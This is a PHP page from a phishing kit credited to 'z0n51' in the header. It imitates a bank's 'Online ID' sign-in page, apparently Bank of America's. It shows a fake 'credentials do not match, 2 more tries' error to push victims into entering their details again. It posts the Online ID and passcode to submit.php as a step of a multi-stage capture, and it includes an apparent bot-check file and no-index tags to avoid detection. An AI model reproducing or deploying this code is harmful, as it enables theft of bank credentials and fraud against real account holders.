<?php

/**
 * @link              https://www.z0n51.com/
 * @since             06/11/2019
 * @package           BOA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */
include('ckh.php');
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Sign In | Online ID</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <img src="../assets/images/logo.png">
                    </div>
                    <div class="col text-right d-lg-block d-md-block d-sm-none d-none">
                        <img src="../assets/images/header-right.png">
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="login-area">
                    <div class="title"><img src="../assets/images/index-title.png"></div>
                    <div class="error-login">
                        <div><i class="fas fa-exclamation-triangle"></i></div>
                        <p>The Online ID or Passcode you entered does not match our records. You have 2 more tries remaining.<br>Please try again or click Forgot ID/Passcode</p>
                    </div>
                    <div class="row">
                        <div class="col-lg-3 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                            <form method="post" action="submit.php">
                                <div class="form-group mb-5">
                                    <label for="online_id">Online ID</label>
                                    <input type="text" name="online_id" id="online_id">
                                    <input type="checkbox" name="vehicle1" value="Bike"> <span>Save this Online ID <i class="fas fa-question-circle"></i></span>
                                </div>
                                <div class="form-group mb-5">
                                    <label for="passcode">Passcode</label>
                                    <input type="password" class="readonly" name="passcode" id="passcode" readonly>
                                    <a href="#">Forgot your Passcode?</a>
                                </div>
                                <input type="hidden" name="type" value="etaplogin2">
                                <input type="hidden" name="verbot">
                                <div class="form-group">
                                    <button type="submit"><i class="fas fa-lock"></i> Sign in</button>
                                </div>
                            </form>
                        </div>
                        <div class="col-lg-9 col-md-12 col-sm-12 col-12 text-lg-right text-md-left text-sm-left d-left">
                            <img class="d-lg-inline-block d-md-none d-sm-none d-none" src="../assets/images/main-content.png">
                            <img class="d-lg-none d-md-inline-block d-sm-none d-none"  src="../assets/images/main-content2.png">
                            <img class="d-lg-none d-md-none d-sm-inline-block d-inline-block"  src="../assets/images/main-content3.png">
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 300px;">
            <div class="container">
                <img class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/footer.png">
                <img class="d-lg-none d-md-none d-sm-block d-block"  src="../assets/images/footer2.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            $('#online_id').keyup(function(){
                if( $(this).val().length > 5 ) {
                    $('#passcode').removeAttr('readonly');
                    $('#passcode').removeClass('readonly');
                } else {
                    $('#passcode').attr('readonly',"");
                    $('#passcode').addClass('readonly');
                }
            });
        </script>

    </body>

</html>